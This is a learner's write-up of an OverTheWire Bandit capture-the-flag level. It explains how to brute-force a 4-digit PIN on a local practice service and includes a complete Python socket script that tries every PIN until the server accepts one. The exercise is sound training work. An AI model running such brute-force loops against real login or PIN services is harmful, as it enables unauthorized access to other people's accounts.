# Bandit Level 24 → Level 25

## Objective

Find the correct 4-digit PIN by brute forcing.

---

## Concept Learned

- Python Scripting
- Socket Programming
- Brute Force Automation
- Networking

---

## Service

```
localhost 30002
```

The service expects

```
password PIN
```

Example

```
currentpassword 1234
```

---

## Python Script

```python
import socket

password = "CURRENT_LEVEL24_PASSWORD"

for pin in range(10000):
    s = socket.socket()

    s.connect(("localhost",30002))

    data = s.recv(1024)

    attempt = f"{password} {pin:04d}\n"

    s.send(attempt.encode())

    response = s.recv(1024).decode()

    if "Wrong" not in response:
        print(response)
        break

    s.close()
```

Run

```bash
python3 brute_force.py
```

Eventually the server returns the Bandit25 password.

---

## Commands Used

```bash
python3
socket
for loop
format strings
```

---

## What I Learned

- Python sockets
- Automation
- Brute force scripting
- Reading server responses